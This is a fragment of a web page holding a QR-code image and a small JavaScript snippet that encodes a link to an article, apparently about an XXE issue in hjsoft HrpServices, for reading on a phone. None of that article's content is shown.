![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hjsoft-services-HrpServices-XXE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 